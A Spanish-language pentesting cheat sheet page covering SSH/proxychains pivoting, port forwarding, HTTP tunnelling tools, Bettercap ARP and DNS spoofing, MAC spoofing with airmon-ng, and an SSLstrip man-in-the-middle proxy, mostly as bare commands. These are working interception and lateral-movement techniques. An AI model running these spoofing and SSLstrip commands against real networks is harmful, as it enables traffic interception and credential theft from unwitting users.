---
layout: article
title: Pentesting - Network
aside:
  toc: true
sidebar:
  nav: side
header:
  theme: dark
  background: black
---

<h2>Pivoting</h2>

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Proxychains</div>
</div>

* Crear túnel SSH Dinámico
~~~
ssh -D <puerto local> <user>@<ip>
~~~
Configurar proxychains
Modificar el puerto '9050' (por defecto) en la última línea por otro que deseemos, por ejemplo, '9090'
~~~
vim /etc/proxychains.conf
~~~
~~~
[ProxyList]
socks4 127.0.0.1 <puerto local>
~~~

* Modificar el timeout para ganar velocidad
~~~
tcp_read_time_out 600
tcp_connect_time_out 800
~~~

* Si se quiere hacer un doble pivotaje
~~~
ssh -D <puerto local 1> <user>@<ip>
proxychains ssh -D <puerto local 2> <user>@<ip>
~~~
Configurara proxychains para el <puerto local 2>
~~~
vim /etc/proxychains.conf
~~~
~~~
[ProxyList]
socks4 127.0.0.1 <puerto local 2>
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Port Forwarding</div>
</div>

~~~
ssh -R <puerto local>:localhost:<puerto local> <user>@<ip>
~~~
~~~
ssh -L <puerto local>:localhost:<puerto local> <user>@<ip>
~~~

**SSH Pivoting**
~~~
$ ssh <user>@<ip> -L <puerto local>:<host víctima>:<puerto víctima> -N
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Túneles HTTP</div>
</div>

**ReGeorg**

[https://github.com/sensepost/reGeorg.git](https://github.com/sensepost/reGeorg.git)

**SSF**

[https://github.com/securesocketfunneling/ssf.git](https://github.com/securesocketfunneling/ssf.git)

<h2>DNS Spoofing</h2>

~~~bash
echo 1 > /proc/sys/net/ipv4/ip_forward # Router mode
~~~

Ver los equipos de la red, seleccionar el host para realizar el ARP Spoofing y ejecutarlo
~~~
> net.show
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
~~~

Establecer el dominio, tanto local como externo (con dns.spoof.all)
~~~
> set dns.spoof.domains apache.org
> set dns.spoof.all true
> dns.spoof on
~~~

Crear un servidor local con http.server (u otros métodos)
~~~
> set http.server.path /var/www/html
> http.server on
~~~

<h2>MAC</h2>

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Cambiar MAC</div>
</div>

~~~bash
sudo macchanger -a wlo1
~~~

~~~bash
sudo airmon-ng start wlo1
airodump-ng –c <canal>–bssid <MAC del router objetivo>–i wlo1mon
sudo airmon-ng stop wlo1mon
sudo ifconfig wlo1 down
sudo macchanger -m <Nueva MAC> wlo1
sudo ifconfig wlo1 up
~~~

<h2>ARP Spoofing</h2>

**Bettercap**

~~~bash
echo 1 > /proc/sys/net/ipv4/ip_forward # Router mode
~~~

~~~
> net.show
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
~~~

<h2>Proxy MiTM</h2>

**Bettercap**

~~~
> set net.sniff.verbose false
> net.sniff on
> set http.proxy.sslstrip true
> http.proxy on
~~~



<h2>Recursos adicionales</h2>

[https://www.hackplayers.com/2018/05/taller-de-pivoting-tuneles-ssh.html](https://www.hackplayers.com/2018/05/taller-de-pivoting-tuneles-ssh.html)

[https://orangecyberdefense.com/fr/insights/blog/ethical_hacking/etat-de-lart-du-pivoting-reseau-en-2019/](https://orangecyberdefense.com/fr/insights/blog/ethical_hacking/etat-de-lart-du-pivoting-reseau-en-2019/)
